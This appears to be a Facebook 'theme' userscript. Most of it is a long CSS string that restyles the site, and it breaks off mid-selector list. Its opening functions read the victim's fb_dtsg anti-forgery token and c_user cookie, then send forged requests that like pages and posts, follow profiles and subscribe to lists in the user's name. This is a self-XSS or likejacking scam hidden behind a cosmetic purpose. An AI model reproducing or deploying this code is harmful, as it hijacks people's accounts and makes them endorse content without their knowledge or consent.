var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+":379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=>=&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

//theme
(function() {
var css = "#facebook body:not(.transparent_widget),#nonfooter,#booklet,.UIFullPage_Container,.fbConnectWidgetTopmost,.connect_widget_vertical_center,.fbFeedbackContent,#LikeboxPluginPagelet\n{ \ncolor: #fff !important;\nbackground: url(\"https://files.myopera.com/mduamrmndlls/files/hoa11.gif\") repeat fixed left center #051022 !important;\n}\n\n\na,.UIActionButton_Text,span,div,input[value=\"Comment\"] {text-shadow: #000 1px 1px 1px !important;}\n\n.UIComposer_InputArea *,.highlighter div{text-shadow: none !important;}\n\n#profile_name {text-shadow: #fff 0 0 2px,#000 1px 1px 3px;}\n\na:hover,.inputbutton:hover,.inputsubmit:hover,.accent,.hover,.domain_name:hover,#standard_error,.UIFilterList_Selected a:hover,input[type=\"submit\"]:not(.fg_action_hide):hover,.button_text:hover,#presence_applications_tab:hover,.UIActionMenu:hover,.attachment_link a span:hover,.UIIntentionalStory_Time a:hover,.UIPortrait_Text .title:hover,.UIPortrait_Text .title span:hover,.comment_link:hover,.request_link span:hover,.UIFilterList_ItemLink .UIFilterList_Title:hover,.UIActionMenu_Text:hover,.UIButton_Text:hover,.inner_button:hover,.panel_item span:hover,li[style*=\"background-color: rgb(255,255,255)\"] .friend_status,.dh_new_media span:hover,a span:hover,.tab_link:hover *,button:hover,#buddy_list_tab:hover *,.tab_handle:hover .tab_name span,.as_link:hover span,input[type=\"button\"]:hover,.feedback_show_link:hover,.page:hover .text,.group:hover .text,.calltoaction:hover .seeMoreTitle,.liketext:hover,.tickerStoryBlock:hover .uiStreamMessage span,.tickerActionVerb,.mleButton:hover,.bigNumber,.pluginRecommendationsBarButton:hover {color: #9cf !important;text-shadow: #fff 0 0 2px !important;text-decoration: none !important;}\n\n\n.fbChatSidebar .fbChatTypeahead .textInput,.fbChatSidebarMessage,.devsitePage .body > .content {box-shadow: none !important;}\n\n.presence_menu_opts,#header,.LJSDialog,.chat_window_wrapper,#navAccount ul,.fbJewelFlyout,.uiTypeaheadView,.uiToggleFlyout { box-shadow: 0 0 3em #000; }\n\n.UIRoundedImage,.UIContentBox_GrayDarkTop,.UIFilterList > .UIFilterList_Title, .dialog-title,.flyout,.uiFacepileItem .uiTooltipWrap {box-shadow: 0 0 1em 1px #000;}\n\n.extra_menus ul li:hover,.UIRoundedBox_Box,.fb_menu_link:hover,.UISelectList_Item:hover,.fb_logo_link:hover,.hovered,#presence_notifications_tab,#chat_tab_barx,.tab_button_div,.plays_val, #mailBoxItems li a:hover,.buddy_row a:hover,.buddyRow a:hover,#navigation a:hover,#presence_applications_tab,#buddy_list_tab,#presence_error_section,.uiStepSelected .middle,.jewelButton,#pageLogo,.fbChatOrderedList .item:hover,.uiStreamHeaderTall {box-shadow: 0 0 3px #000,inset 0 0 5px #000 !important;}\n\n\n.topNavLink > a:hover,#navAccount.openToggler,.selectedCheckable {box-shadow: 0 0 4px 2px #9cf,inset 0 0 2em #69f !important;}\n\n\n.fbChatBuddyListDropdown .uiButton,.promote_page a,.create_button a,.share_button_browser div,.silver_create_button,.button:not(.uiSelectorButton):not(.close):not(.videoicon),button:not(.as_link),.GBSearchBox_Button,.UIButton_Gray,.UIButton,.uiButton:not(.uiSelectorButton),.fbPrivacyWidget .uiSelectorButton:not(.lockButton),.uiButtonSuppressed,.UIActionMenu_SuppressButton,.UIConnectControlsListSelector .uiButton,.uiSelector:not(.fbDockChatDropdown) .uiSelectorButton:not(.uiCloseButton),.fbTimelineRibbon,#fbDockChatBuddylistNub .fbNubButton,.pluginRecommendationsBarButtonLike {box-shadow: 0 0 .5em rgba(0,0,0,0.9),inset 0 0 .75em #9cf !important;border-width: 0 !important; }\n\n.fbChatBuddyListDropdown .uiButton:hover,.uiButton:not(.uiSelectorButton):hover,.fbPrivacyWidget .uiSelectorButton:not(.lockButton):hover,.uiButtonSuppressed:hover,.UIButton:hover,.UIActionMenu_Wrap:hover,.tabs li:hover,.ntab:hover,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([type=\"Flag\"]):not([type=\"submit\"]):hover,.inputsubmit:hover,.promote_page:hover,.create_button:hover,.share_button_browser:hover,.silver_create_button_shell:hover,.painted_button:hover,.flyer_button:hover,.button:not(.close):not(.uiSelectorButton):not(.videoicon):hover,button:not(.as_link):hover,.GBSearchBox_Button:hover,.tagsWrapper,.UIConnectControlsListSelector .uiButton:hover,.uiSelector:not(.fbDockChatDropdown) .uiSelectorButton:not(.uiCloseButton):hover,.fbTimelineMoreButton:hover,#fbDockChatBuddylistNub .fbNubButton:hover,.tab > div:not(.title):hover,.detail.frame:hover,.pluginRecommendationsBarButtonLike:hover {box-shadow: 0 0 .5em #000,0 0 1em 3px #9cf,inset 0 0 2em #69f !important;}\n\n#icon_garden,.list_select .friend_list {box-shadow: 0 0 3px -1px #000,inset 0 0 3px -1px #000;}\n\n.bb .fbNubButton,.uiScrollableAreaGripper {box-shadow: inset 0 4px 8px #9cf,0 0 1em #000 !important;}\n\n.bb .fbNubButton:hover {box-shadow: inset 0 4px 8px #9cf,0 .5em 1em 1em #9cf !important;}\n\n.fbNubFlyoutTitlebar {box-shadow: inset 0 4px 8px #9cf;padding: 0 4px !important;}\n\n#fb_menubar,.progress_bar_outer {box-shadow: inset 0 0 3px #000,0 0 3em 3px #000;}\n#presence_ui {box-shadow: 0 0 3em 1px #000}\n\n#buddy_list_tab:hover,.tab_handle:hover,.focused  {box-shadow: 0 0 3px #000,inset 0 0 3px #000,0 0 3em 5px #fff;}\n\n.uiSideNavCount,.jewelCount,.uiContextualDialogContent,.fbTimelineCapsule .fbTimelineTwoColumn > .timelineUnitContainer:hover,.timelineReportContainer:hover,.uiOverlayPageContent,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.uiScaledImageContainer:hover, .pagesVoiceBar, ._k5 {box-shadow: 0 0 1em 4px #9cf !important;}\n\n.img_link:hover,.album_thumb:hover,.fbChatTourCallout .body,.fbSidebarGripper div {box-shadow: 0 0 3em #9cf;}\n\n.shaded,.progress_bar_inner,.tickerStoryAllowClick {box-shadow: inset 0 0 1em #9cf !important}\n\n.UIPhotoGrid_Table .UIPhotoGrid_TableCell:hover .UIPhotoGrid_Image,#myphoto:hover,.mediaThumbWrapper:hover,.uiVideoLink:hover,.mediaThumb:hover,#presence.fbx_bar #presence_ui #presence_bar .highlight,.fbNubFlyout:hover,.hovercard .stage,#fbDockChatBuddylistNub .fbNubFlyout:hover,.balloon-content,.-cx-PRIVATE-uiDialog__border  {box-shadow: 0 0 3em 5px #9cf !important;}\n\n.fbNubFlyout,.uiMenuXBorder {box-shadow: 0 0 3em 5px #000 !important;}\n\n#blueBar {box-shadow: 0 0 1em 3px #000 !important;}\n\n\n.fill {box-shadow: inset 0 0 2em #69f,0 0 1em #000 !important;}\n\n\ninput[type=\"file\"]{-moz-appearance:none!important;border: none !important;}\n\n\n.status_text,h4,a,h2,.flyout_menu_title,.url,#label_nm,h5,.WelcomePage_MainMessage,#public_link_uri,#public_link_editphoto span,#public_link_editalbum span,.dh_subtitle,.app_name_heading,.box_head,.presence_bar_button span,a:link span,#public_link_album span,.note_title,.link_placeholder,.stories_title,.typeahead_suggestion,.boardkit_title,.section-title strong,.inputbutton,.inputsubmit,.matches_content_box_title,.tab_name,.header_title_text,.signup_box_message,.quiz_start_quiz,.sidebar_upsell_header,.wall_post_title,.megaphone_header,.source_name,.UIComposer_AttachmentLink,.fcontent > .fname,#presence_applications_tab,.mfs_email_title,.flyout .text,.UIFilterList_ItemLink .UIFilterList_Title,.announce_title,.attachment_link a span,.comment_author,.UIPortrait_Text .title,.comment_link,.UIIntentionalStory_Names,#profile_name,.UIButton_Text,.dh_new_media span,.share_button_browser div,.UIActionMenu_Text,.UINestedFilterList_Title,button,.panel_item span,.stat_elem,.action,#contact_importer_container input[value=\"Find Friends\"]:hover,.navMore,.navLess,input[name=\"add\"],input[name=\"actions[reject]\"],input[name=\"actions[accept]\"],input[name=\"actions[maybe]\"],.uiButtonText,.as_link .default_message,.feedback_hide_link,.feedback_show_link,#fbpage_fan_sidebar_text,.comment_actual_text a span,.uiAttachmentDesc a span,.uiStreamMessage a span,.group .text,.page .text,.uiLinkButton input,.blueName,.uiBlingBox span.text,.commentContent a span,.uiButton input,.fbDockChatTab .name,.simulatedLink,.bfb_tab_selected,.liketext,a.UIImageBlock_Content,.uiTypeaheadView li .text,.author,.authors,.itemLabel,.passiveName,.token,.fbCurrentTitle,.fbSettingsListItemLabel,.uiIconText,#uetqg1_8,.fbRemindersTitle,.mleButton,.uiMenuItem .selected .name  {color: #9cf !important;}\n\n#email,option,.disclaimer,.info dd,.UIUpcoming_Info,.UITos_ReviewDescription,.settings_box_text,div[style*=\"color: rgb(85,85,85)\"] {color: #999 !important;}\n\n.status_time,.header_title_wrapper,.copyright,#newsfeed_submenu,#newsfeed_submenu_content strong,.summary,.caption,.story_body,.social_ad_advert_text,.createalbum dt,.basic_info_summary_and_viewer_actions dt,.info dt,.photo_count,p,.fbpage_fans_count,.fbpage_type,.quiz_title,.quiz_detailtext,.byline,label,.fadvfilt b,.fadded,.fupdt,.label,.main_subtitle,.minifeed_filters li,.updates_settings,#public_link_photo,#phototags em,#public_link_editphoto,.note_dialog,#public_link_editalbum,.block_add_person,.privacy_page_field,.action_text,.network,.set_filters span,.byline span,#no_notes,#cheat_sheet,.form_label,.share_item_actions,.options_header,.box_subtitle,.review_header_subtitle_line,.summary strong,.upsell dd,.availability_text,#public_link_album,.explanation,.aim_link,.subtitle,#profile_status,span[style*=\"color: rgb(51,51,51)\"],.fphone_label,.phone_type_label,.sublabel,.gift_caption,dd span,.events_bar,.searching,.event_profile_title,.feedBackground,.fp_show_less,.increments td,.status_confirm,.sentence,.admin_list span,.boardkit_no_topics,.boardkit_subtitle,.petition_preview,.boardkit_topic_summary,li,#photo_badge,.status_body,  .spell_suggest_label,.pg_title,.white_box,.token span,.profile_activation_score,.personal_msg span,.matches_content_box_subtitle span,tr[fbcontext=\"41097bfeb58d\"] td,.title,.floated_container span:not(.accent),div[style*=\"color: rgb(85,85,85)\"],div[style*=\"color: rgb(68,68,68)\"],.present_info_label,.fbpage_description,.tagged span,#tags h2 strong,#tags div span,.detail,.chat_info_status,.gray-text,.author_header,.inline_comment,.fbpage_info,.gueststatus,.no_pages,.topic_pager,.header_comment span,div[style*=\"color: rgb(101,107,111)\"],#q,span[style*=\"color: rgb(85,85,85)\"],.pl-item,.tagged_in,.pick_body,td[style*=\"color: rgb(85,85,85)\"],strong[style*=\"color: rgb(68,68,68)\"],div[style*=\"color: gray\"],.group_officers dd,.fbpage_group_title,.application_menu_divider,.friend_status span,.more_info,.logged_out_register_subhead,.logged_out_register_footer,input[type=\"text\"],textarea,.status_name span,input[type=\"file\"],.UIStoryAttachment_Copy,.stream_participants_short,.UIHotStory_Copy,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not(.UIButton_Text):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),input[type=\"search\"],input[type=\"input\"],.inputtext,.relationship span,input[type=\"button\"]:not([value=\"Comment\"]),input[type=\"password\"],#reg_pages_msg,.UIMutableFilterList_Tip,.like_sentence,.UIIntentionalStory_InfoText,.UIHotStory_Why,.question_text,.UIStory,.tokenizer,input[type=\"hidden\"],.tokenizer_input *,.text:not(.external),.flistedit b,.fexth,.UIActionMenu_Main,span[style*=\"color: rgb(102,102,102)\"],div[style*=\"color: rgb(85,85,85)\"],div[style*=\"color: rgb(119,119,119)\"],blockquote,.description,.security_badge,.full_name,.email_display,.email_section,.chat_fl_nux_messaging,.UIObjectListing_Subtext,.confirmation_login_content,.confirm_username,.UIConnectControls_Body em,.comment_actual_text,.status,.UICantSeeProfileBlurbText,.UILiveLink_Description,.recaptcha_text,.UIBeep_Title,.UIComposer_Attachment_ShareLink_URL,.app_dir_app_category,.first_stat,.aggregate_review_title,.stats span,.facebook_disclaimer,.app_dir_app_creator,.app_dir_app_monthly_active_users,.app_dir_app_friend_users,.UISearchFilterBar_Label,.UIFullListing_InfoLabel,.email_promise_detail,.title_text,.excerpt,.dialog_body,.tos,.UIEMUASFrame_body,.page_note,.nux_highlight_composer,.UIIntentionalStory_BottomAttribution,.tagline,.GBSelectList,.gigaboxx_thread_header_authors,.GBThreadMessageRow_ReferrerLink,#footerWrapper,.infoTitle,.fg_explain,.UIMentor_Message,.GenericStory_BottomAttribution,.chat_input,.video_timestamp span,#tagger_prompt,.UIImageBlock_Content,.new_list span, .GBSearchBox_Input input,.SearchPage_EmailSearchLeft,.sub_info,.UIBigNumber_Label,.UIInsightsGeoList_ListTitle,.UIInsightsGeoList_ListItemValue,.UIInsightsSmall_Note,.textmedium,.UIFeedFormStory_Lead,.home_no_stories_content, .title_label,div[style*=\"color: rgb(102,102,102)\"],*[style*=\"color: rgb(51,51,51)\"],.tab_box_inner,.uiStreamMessage,.privacy_section_description,.info_text,.uiAttachmentDesc,.uiListBulleted span,.privacySettingsGrid th,.recommendations_metadata,.postleft dd:not(.usertitle),.postText,.mall_post_body_text,.fbChatMessage,.fbProfileBylineFragment,.nosave option,.uiAttachmentDetails,.fbInsightsTable td,.mall_post_body,.uiStreamPassive,.snippet,.questionInfo span,.promotionsHowto,.fcg,.headerColumn .fwb,.rowGroupTitle .fwb,.rowGroupDescription .fwb,.likeUnit,.aboveUnitContent,.placeholder,.sectionContent,.UIFaq_Snippet,.uiMenuItem:not(.checked) .name,.balloon-text,.fbLongBlurb,.legendLabel,.messageBody {color: #bbb !important;}\n\n.status_clear_link,h3,h1,.updates,.WelcomePage_SignUpHeadline,.WelcomePage_SignUpSubheadline,.mock_h4 .left,.review_header_title,caption,.logged_out_register_msg,.domain_name, .UITitledBox_Title,.signup_box_content,.highlight,.question,.whocan span,.UIFilterList > .UIFilterList_Title,.subject,.UIStoryAttachment_Label,.typeahead_message,.UIShareStage_Title,.alternate_name,.helper_text,.textlarge,.page .category,.item_date,.privacy_section_label,.privacy_section_title,.uiTextMetadata, .seeMoreTitle,.categoryContents,code,.usertitle,.fbAppSettingsPageHeader,.fsxl,.LogoutPage_MobileMessage,.LogoutPage_MobileSubmessage,.recommended_text,#all_friends_text,.removable,.ginormousProfileName,.experienceContent .fwb,#bfb_t_popular_body div[style*=\"color:#880000\"],.fsm:not(.snippet):not(.itemLabel):not(.fbChatMessage),.uiStreamHeaderTextRight,.bookmarksNavSeeAll,.tab .content,.fbProfilePlacesFilterCount,.fbMarketingTextColorDark,.pageNumTitle,.pluginRecommendationsBarButton {color: #69f !important;}\n\n.em,.story_comment_back_quote,.story_content,small,.story_content_excerpt,.walltext,.public,p span,#friends_page_subtitle,.main_title,.empty_message,.count,.count strong,.stories_not_included li span,.mobile_add_phone th,#friends strong,.current,.no_photos,.intro,.sub_selected a,.stats,.result_network,.note_body,#bodyContent div b,#bodyContent div,.upsell dt,.buddy_count_num strong,.left,.body,.tab .current,.aim_link span,.story_related_count,.admins span,.summary em,.fphone_number,.my_numbers_label,.blurb_inner,.photo_header strong,.note_content,.multi_friend_status,.current_path span,.current_path,.petition_header,.pyramid_summary strong,#status_text,.contact_email_pending em,.profile_needy_message,.paging_link div,.big_title,.fb_header_light,.import_status strong,.upload_guidelines ul li span,.upload_guidelines ul li span strong,#selector_status,.timestamp strong,.chat_notice,.notice_box,.text_container,.album_owner,.location,.info_rows dd,.divider,.post_user,div[style=\"color: rgb(101,107,111);\"] b,div[style=\"color: rgb(51,51,51);\"] b,.basic_info_summary_and_viewer_actions dd,.profile_info dd,.story_comment,p strong,th strong,.fstatus,.feed_story_body,.story_content_data,.home_prefs_saved p,.networks dd,.relationship_status dd,.birthday dd,.current_city dd,.UIIntentionalStory_Message,.UIFilterList_Selected a,.UIHomeBox_Title,.suggestion,.spell_suggest,.UIStoryAttachment_Caption,.fexth + td,.fext_short,#fb_menu_inbox_unread_count,.Tabset_selected .arrow .sel_link span,.UISelectList_check_Checked,.chat_fl_nux_header,.friendlist_status .title a,.chat_setting label,.UIPager_PageNum,.good_username,.UIComposer_AttachmentTitle,.rsvp_option:hover label,.Black,.comment_author span,.fan_status_inactive,.holder,.UIThumbPagerControl_PageNumber,.text_center,.nobody_selected,.email_promise,.blocklist ul,#advanced_body_1 label,.continue,.empty_albums,div[style*=\"color: black\"],.GBThreadMessageRow_Body_Content,.UIShareStage_Subtitle,#public_link_photo span,.GenericStory_Message,.UIStoryAttachment_Value,div[style*=\"color: black\"],.SearchPage_EmailSearchTitle,.uiTextSubtitle,.jewelHeader,.recent_activity_settings_label,.people_list_item,.uiTextTitle,.tab_box,.instant_personalization_title,.MobileMMSEmailSplash_Description,.MobileMMSEmailSplash_Tipsandtricks_Title,.fcb,input[value=\"Find Friends\"],#bodyContent,#bodyContent table,h6,.fbChatBuddylistError,.info dt,.bfb_options_minimized_hide,.connect_widget_connected_text,body.transparent_widget .connect_widget_not_connected_text,.connect_widget_button_count_count,.fbInsightsStatisticNumber,.fbInsightsTable thead th span,.header span,.friendlist_name a,.count .countValue,.uiHeaderTitle span,#about_text_less span,.uiStreamHeaderText,.navHeader,.uiAttachmentTitle,.fbProfilePlacesFilterText,.tagName,.ufb-dataTable-header-text,.ufb-text-content,.fb_content,.uiComposerAttachment .selected .attachmentName,.balloon-title,.cropMessage {color: #fff !important;}\n\n.bfb_post_action_container {opacity: .25 !important;}\n.bfb_post_action_container:hover {opacity: 1 !important;}\n\n.valid,.wallheader small,#photodate,.video_timestamp strong,.date_divider span,.feed_msg h5,.time,.item_contents,.boardkit_topic_updated,.walltime,.feed_time,.story_time,#status_time_inner,.written small,.date,div[style*=\"color: rgb(85,82,37)\"],.timestamp span,.time_stamp,.timestamp,.header_info_timestamp,.more_info div,.timeline,.UIIntentionalStory_Time,.fupdt,.note_timestamp,.chat_info_status_time,.comment_actions,.UIIntentionalStory_Time a,.UIUpcoming_Time,.rightlinks,.GBThreadMessageRow_Date,.GenericStory_Time a,.GenericStory_Time,.fbPrivacyPageHeader,.date_divider {color: #69f !important;}\n\n.textinput,select,.list_drop_zone,.msg_divide_bottom,textarea,input[type=\"text\"],input[type=\"file\"],input[type=\"search\"],input[type=\"input\"],input[type=\"password\"],.space,.tokenizer,input[type=\"hidden\"],#flm_new_input,.UITooltip:hover,.UIComposer_InputShadow,.searchroot input,input[name=\"search\"],.uiInlineTokenizer,input.text,input.nosave {background: rgba(0,0,0,.50) !important;-moz-appearance:none!important;color: #bbb !important;border: none !important;padding: 3px !important; }\n\ninput[type=\"text\"]:focus,textarea:focus,.fbChatSidebar .fbChatTypeahead .textInput:focus {box-shadow: 0 0 .5em #9cf,inset 0 0 .25em #69f !important;}\n\n.uiOverlayPageWrapper,#fbPhotoSnowlift,.shareOverlay,.tlPageRecentOverlay  {background: -moz-radial-gradient(50% 50%,circle,rgba(10,10,10,.6),rgb(10,10,10) 90%) !important;}\n\n.bumper,.stageBackdrop {background: #000 !important;}\n#page_table {background: #333 }\n\n.checkableListItem:hover a,.selectedCheckable a  {background: #69f !important; }\n\n.GBSearchBox_Input,.tokenizer,.LTokenizerWrap,#mailBoxItems li a:hover,.uiTypeaheadView .search .selected,.itemAnchor:hover,.notePermalinkMaincol .top_bar, .notification:hover a,#bfb_tabs div:not(.bfb_tab_selected),.bfb_tab,.navIdentity form:hover,.connect_widget_not_connected_text,.uiTypeaheadView li.selected,.connect_widget_number_cloud,.placesMashCandidate:hover,.highlight,#bfb_option_list li a:hover {background: rgba(0,0,0,.5) !important;}\n\n.results .page,.calltoaction,.results li,.fbNubFlyout,.contextualBlind,.bfb_dialog,.bfb_image_preview,input.text,.fbChatSidebar,.jewelBox,.clickToTagMessage,.tagName,.ufb-tip-body,.flyoutContent,.fbTimelineMapFilterBar,.fbTimelineMapFilter,.fbPhotoStripTypeaheadForm,.groupsSlimBarTop,.pas,.contentBox,.fbMapCalloutMain, .pagesVoiceBar {background: rgba(10,10,10,.75) !important;}\n\n#pageNav .tinyman:hover a,#navHome:hover a,#pageNav .tinyman a[style*=\"cursor: progress\"],#navHome a[style*=\"cursor: progress\"],#home_filter_list,#home_sidebar,#contentWrapper,.LDialog,.dialog-body,.LDialog,.LJSDialog,.dialog-foot,.chat_input,#contentCol,#leftCol,.UIStandardFrame_Content,.red_box,.yellow_box,.uiWashLayoutOffsetContent,.uiOverlayContent,.bfb_post_action_container,.connect_widget_button_count_count,.shaded,.navIdentitySub,.jewelItemList li a:hover,.fbSidebarGripper div,.jewelCount,.uiBoxRed,.videoUnit,.lifeEventAddPhoto,.fbTimelineLogIntroMegaphone,.uiGamesLeaderboardItem,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.newInterestListNavItem:hover,.ogSliderAnimPagerPrevContent,.ogSingleStoryStatus,.ogSliderAnimPagerNextContent,.-cx-PRIVATE-uiDialog__body,.jewelItemNew .messagesContent   {background: rgba(10,10,10,.5) !important;}\n\n#home_stream,pre,.ufiItem,.odd,.uiBoxLightblue,.platform_dialog_bottom_bar,.uiBoxGray,.fbFeedbackPosts,.mall_divider_text,.uiWashLayoutGradientWash, #bfb_options_body,.UIMessageBoxStatus,.tip_content .highlight,.fbActivity, .auxlabel,.signup_bar_container,#wait_panel,.FBAttachmentStage,.sheet,.uiInfoTable .name,.HCContents,#devsiteHomeBody .content,.devsitePage .nav .content,#confirm_phone_frame,.fbTimelineCapsule .timelineUnitContainer,.timelineReportContainer,.aboveUnitContent,.aboutMePagelet,#pagelet_tab_content_friends,#fbProfilePlacesBorder,#pagelet_tab_content_notes,.externalShareUnit,.fbTimelineNavigationWrapper .detail,.tosPaneInfo,.navSubmenu:hover,#bfb_donate_pagelet > div,.better_fb_mini_message,.uiBoxWhite,.uiLoadingIndicatorAsync,.mleButton,.fbTimelineBoxCount,.navSubmenu:hover,.gradient,.profileBrowserGrid tr > td > div,.statsContainer,#admin_panel,.fbTimelineSection, .escapeHatch, .ogAggregationPanelContent, .-cx-PRIVATE-fbTimelineExternalShareUnit__root, .shareUnit a, .storyBox  {background: rgba(20,20,20,.4) !important;}\n\n.feed_comments,.home_status_editor,#rooster_container,.rooster_story,.UIFullPage_Container,.UIRoundedBox_Box,.UIRoundedBox_Side,.wallpost,.profile_name_and_status,.tabs_wrapper,.story,#feedwall_controls,.composer_well,.status_composer,.home_main_item,.feed_item,.HomeTabs_tab,#feed_content_section_applications li,.menu_separator,a[href=\"/friends\"],.feed_options_link,.show_all_link,.status,#newsfeed_submenu,.morecontent_toggle_link,.more_link,.composer_tabs,.bl,.profile_tab,.story_posted_item,.left_column,.pager_next,.admarket_ad,.box,.inside,.shade_b,.who_can_tab,.summary_simple,.footer_submit_rounded,.well_content,.info_section,.item_content,.basic_info_summary_and_viewer_actions dt,.info dt,.photo_table,.extra_content,.main_content,.search_inputs,.search_results,.result,.bar,.smalllinks span,.quiz_actionbox,.column,.note_header,.fdh,#fpgc,#fpgc td,.fmp,.fadvfilt,.fsummary,.frn,.two_column_wrapper,#new_ff,.see_more,.message_rows,.message_rows tr,.toggle_tabs li,.toggle_tabs li a,.notifications,.updates_all,.composer,.WelcomePage_MainSellContainer,.WelcomePage_MainSell,.media_gray_bg,.photo_comments_container,.photo_comments_main,.empty_message,.UIMediaHeader_Title,.UIMediaHeader_SubHeader,.footer_bar,.single_photo_header,#editphotoalbum,.covercheck,#newalbum,.panel,.album,.dh_titlebar,.page_content,.dashboard_header,.photos_header,.privacy_summary_items,.privacy_summary_item,.block_overview,.privacy_page_field,.editor_panel,.block,.action_box,.even_column,.mobile_account_inlay,.language,.confirm_boxes,.confirm,.status_confirm,.hasnt_app,.container, .UIDashboardHeader_TitleBar,.UIDashboardHeader_Container,.note,.UITwoColumnLayout_Container,.dialog_body,.dialog_buttons,.group_lists,.group_lists th,.group_list,.updates,.share_section,#profilenarrowcolumn,#profilewidecolumn,#inline_wall_post,.post_link_bar,.helppro_content,.answers_list_header,#help_titlebar,.new_user_guide,.new_user_guide_content,.flag_nav_item,.flag_nav_item a,.arrowlink a,#safety_page,#safety_page h5,.dashbar,.disclaimer,#store_options,#store_window,.step,.canvas_rel_positioning, .app_type a,.sub_selected a,.box_head,.inside_the_box,.app_about,.fallback,.box_subhead,.fbpage_card,#devsite_menubar,.content_sidebar,.side, .pBody li a,#p-logo,#p-navigation,#p-navigation .pBody,#bodyContent h1,#p-wiki,#p-wiki .pBody,#p-search,#p-search .pBody,#p-tb,#p-tb .pBody,#bodyContent table,#bodyContent table div,.recent_news,.main_news,.news_header, .devsite_subtabs li a,.middle-container,.feed_msg h4,.ads_info,.contact_sales,.wrapper h3,.presence_bar_button:hover,.icon_garden_elem:hover,#profile_minifeed,.focused,.dialog_summary,.tab span,.wallkit_postcontent h4,.address,#badges,.badge_holder,.aim_link,.user_status,.section_editor,.my_numbers,.photo_editor,.gift_rows,.sub_menu,.main-nav-tabs li a,.submenu_header,.new_gift,#profile_footer_actions,#status_bar,#summaryandpager,.userlist,#feedBody,#feedHeaderContainer,#feedContent,.feedBackground,.mixer_panel,.titles,.sliders,.slider_holder,.fbpage_title,.options,#linkeditorform,.sideNavItem .item,.typeahead_list_with_shadow,.module,.tc,.bc,.footer, .answer,.announcement,.basic_info_content,.slot,.boardkit_no_topics,.ranked_friend,.boardkit_subtitle,.filter-tabs,.level,.level_summary,.cause, .attachment_stage,.attachment_stage_area,.beneficiary_info,#info_tab,#feedwall_with_composer,.frni,.frni a,.flistedit,.fmp_delete,#feed_content_section_friend_lists li,.composer_tabs li:not(.selected),.menu_content li a,.view_on,.rounded-box,.ffriend,.tab_content,.wrapper_background,.full_container,.white_box,#friends li a,#inline_composer,.skin_body,.invite_tab_selected,.inside table,.matches_matches_box,.matches_content_box_subtitle,tr[fbcontext=\"41097bfeb58d\"],.dialog_body div div,.new_menu_off,.present_info_label,.import_status,.upload_guidelines,.tagger_border,.chat_info,.chat_conv_content,.chat_conv,.visibility_change,.pic_padding,.chat_notice,.chat_input_div,.wrapper,.toolbar_button,.toolbar_button_label,.pages_dashboard_panel,.no_pages,.divider,#filterview,#groupslist,.grouprow,.grouprow table,.board_topic,#big_search,#invitation_list,#invitation_wrapper,.emails_error, .outer_box,.inner_box,.days_remaining,.module,.submodule,.ntab,.ntab .tab_link,.grayheader,.inline_wall_post,.related_box,.home_box_wrapper,.two_column,.challenge_stats,.quiz_box, #fb_challenge,#fb_challenge_page,.challenge_leaderboard,.leaderboard_tile, .sidebar_upsell,.concerts_module,.container_box,#login_homepage,.user_hatch_bg,.pick_main,#homepage,.wall_post_body,.track,.HomeTabs_tab a,.minifeed,.alert_wrap,.logged_in_vertical_alert,.info_column,#public_listing_friends,#public_listing_pages,.gamertag_app,.gamerProfileBody,#photo_picker,.album_picker .page0 .row,.dialog_loading,.timeline,.partyrow,.partyrow table,#invite_list li,.group_info_section,#moveable_wide,.UIProfileBox_Content,.story_content,.settings_panel,.app_browser 